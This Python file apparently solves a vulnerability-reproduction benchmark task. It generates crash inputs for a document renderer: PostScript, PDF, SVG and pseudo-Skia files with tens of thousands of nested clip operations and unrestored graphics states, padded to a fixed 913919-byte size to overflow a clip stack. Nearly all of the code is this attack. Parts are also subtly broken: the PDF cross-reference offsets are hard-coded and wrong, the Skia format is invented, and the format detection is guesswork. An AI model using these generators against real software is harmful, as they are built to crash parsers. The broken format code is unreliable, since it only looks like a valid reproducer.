import os
import re
import tarfile
import tempfile
import subprocess
import shutil
from pathlib import Path
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source code
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tarball
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find root directory (assuming single top-level dir)
            root_dir = os.path.join(tmpdir, os.listdir(tmpdir)[0])
            
            # Analyze to determine format and generate PoC
            poc = self._generate_poc(root_dir)
            return poc
    
    def _generate_poc(self, root_dir: str) -> bytes:
        # First try to identify the format by looking for common patterns
        format_hints = self._detect_format(root_dir)
        
        # Try different generators based on hints
        if 'pdf' in format_hints:
            return self._generate_pdf_poc()
        elif 'ps' in format_hints or 'postscript' in format_hints:
            return self._generate_postscript_poc()
        elif 'svg' in format_hints:
            return self._generate_svg_poc()
        elif 'skp' in format_hints or 'skia' in format_hints:
            return self._generate_skp_poc()
        else:
            # Default to a simple depth attack with repeated operations
            return self._generate_generic_poc()
    
    def _detect_format(self, root_dir: str) -> set:
        formats = set()
        
        # Look for common file patterns
        for root, _, files in os.walk(root_dir):
            for file in files:
                if file.endswith('.pdf'):
                    formats.add('pdf')
                elif file.endswith('.ps') or file.endswith('.eps'):
                    formats.add('ps')
                    formats.add('postscript')
                elif file.endswith('.svg'):
                    formats.add('svg')
                elif file.endswith('.skp'):
                    formats.add('skp')
                    formats.add('skia')
                
                # Look for clues in source files
                if file.endswith(('.c', '.cpp', '.cc', '.h', '.hpp')):
                    try:
                        with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read(8192)
                            if 'PDF' in content or 'pdf' in file.lower():
                                formats.add('pdf')
                            if 'PostScript' in content or 'PS' in content:
                                formats.add('ps')
                                formats.add('postscript')
                            if 'SVG' in content or 'svg' in file.lower():
                                formats.add('svg')
                            if 'Skia' in content or 'SKP' in content:
                                formats.add('skia')
                                formats.add('skp')
                    except:
                        continue
        
        return formats
    
    def _generate_generic_poc(self) -> bytes:
        """Generate a generic PoC that pushes clip operations deeply."""
        # Create a simple format with repeated clip operations
        # This is designed to trigger depth-related vulnerabilities
        poc_lines = []
        
        # Header
        poc_lines.append("%!PS-Adobe-3.0")
        poc_lines.append("%%Creator: PoC Generator")
        poc_lines.append("%%Pages: 1")
        poc_lines.append("%%EndComments")
        
        # Set up initial state
        poc_lines.append("<< /PageSize [612 792] >> setpagedevice")
        poc_lines.append("1 setlinewidth")
        
        # Generate deeply nested clip operations
        # Each clip operation pushes onto the clip stack
        depth = 50000  # Large enough to overflow
        
        for i in range(depth):
            # Create a clipping path
            x = i % 600
            y = i % 700
            poc_lines.append(f"newpath {x} {y} moveto")
            poc_lines.append(f"{x+10} {y} lineto")
            poc_lines.append(f"{x+10} {y+10} lineto")
            poc_lines.append(f"{x} {y+10} lineto")
            poc_lines.append("closepath")
            poc_lines.append("clip")
            
            # Occasionally add gsave to increase nesting
            if i % 100 == 0:
                poc_lines.append("gsave")
        
        # Footer
        poc_lines.append("showpage")
        poc_lines.append("%%EOF")
        
        poc = "\n".join(poc_lines).encode('latin-1')
        
        # Ensure we reach approximately the target size
        target_size = 913919
        if len(poc) < target_size:
            # Pad with comments
            padding = b"\n% " + b"x" * (target_size - len(poc) - 100) + b"\n"
            poc = poc.split(b"%%EOF")[0] + padding + b"%%EOF"
        
        return poc[:target_size]
    
    def _generate_postscript_poc(self) -> bytes:
        """Generate PostScript PoC with deep clip nesting."""
        # Similar to generic but with PostScript-specific optimizations
        return self._generate_generic_poc()
    
    def _generate_pdf_poc(self) -> bytes:
        """Generate PDF PoC with deep clip nesting."""
        # PDF structure
        header = b"%PDF-1.4\n"
        
        # Create objects
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Content stream with deep clipping
        content = b"q\n"  # Save state
        depth = 100000
        
        for i in range(depth):
            # Create clipping path
            x = i % 600
            y = i % 700
            content += f"{x} {y} m\n".encode()
            content += f"{x+10} {y} l\n".encode()
            content += f"{x+10} {y+10} l\n".encode()
            content += f"{x} {y+10} l\n".encode()
            content += b"h\n"  # closepath
            content += b"W\n"  # clip
            content += b"n\n"  # end path without filling
            
            # Additional state save every 100 operations
            if i % 100 == 0:
                content += b"q\n"
        
        # Never restore states to keep stack growing
        content_length = len(content)
        
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n"
        obj4 = f"4 0 obj\n<< /Length {content_length} >>\nstream\n".encode() + content + b"\nendstream\nendobj\n"
        
        # Cross-reference table
        xref = b"""xref
0 5
0000000000 65535 f 
0000000010 00000 n 
0000000050 00000 n 
0000000100 00000 n 
0000000200 00000 n 
"""
        
        # Calculate positions (simplified)
        start_xref = len(header) + len(obj1) + len(obj2) + len(obj3) + len(obj4)
        
        trailer = f"""trailer
<< /Size 5 /Root 1 0 R >>
startxref
{start_xref}
%%EOF""".encode()
        
        poc = header + obj1 + obj2 + obj3 + obj4 + xref + trailer
        
        # Adjust to target size
        target_size = 913919
        if len(poc) < target_size:
            # Add padding in content stream
            padding = b" " * (target_size - len(poc))
            poc = poc.replace(b"\nendstream", padding + b"\nendstream")
        
        return poc[:target_size]
    
    def _generate_svg_poc(self) -> bytes:
        """Generate SVG PoC with deep clip nesting."""
        header = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1000" height="1000">
"""
        
        # Create deeply nested clip paths
        content = b""
        depth = 5000
        
        for i in range(depth):
            content += f'<clipPath id="clip{i}">\n'.encode()
            content += f'  <rect x="{i%900}" y="{i%900}" width="10" height="10"/>\n'.encode()
            content += f'  <use xlink:href="#clip{i-1 if i>0 else "0"}" />\n'.encode()
            content += b'</clipPath>\n'
        
        # Apply the deepest clip path
        content += b'<g clip-path="url(#clip' + str(depth-1).encode() + b')">\n'
        content += b'<rect x="0" y="0" width="1000" height="1000" fill="red"/>\n'
        content += b'</g>\n'
        
        footer = b'</svg>'
        
        poc = header + content + footer
        
        # Adjust size
        target_size = 913919
        if len(poc) < target_size:
            # Add comments
            padding = b"<!-- " + b"x" * (target_size - len(poc) - 10) + b" -->\n"
            poc = header + padding + content + footer
        
        return poc[:target_size]
    
    def _generate_skp_poc(self) -> bytes:
        """Generate SKP (Skia Picture) PoC."""
        # SKP files are binary Skia Picture format
        # We'll create a simple structure with repeated clip operations
        
        # SKP header (simplified)
        header = b"Skia Picture Version 1\n"
        
        # Create content with many clip operations
        content = b""
        depth = 100000
        
        for i in range(depth):
            # Simplified representation of clip operations
            # Actual SKP format is complex, but we approximate
            content += b"CLIP"  # Operation type
            content += i.to_bytes(4, 'little')  # x
            content += i.to_bytes(4, 'little')  # y
            content += (i+10).to_bytes(4, 'little')  # width
            content += (i+10).to_bytes(4, 'little')  # height
        
        poc = header + content
        
        # Pad to target size
        target_size = 913919
        if len(poc) < target_size:
            padding = b"\x00" * (target_size - len(poc))
            poc += padding
        
        return poc[:target_size]
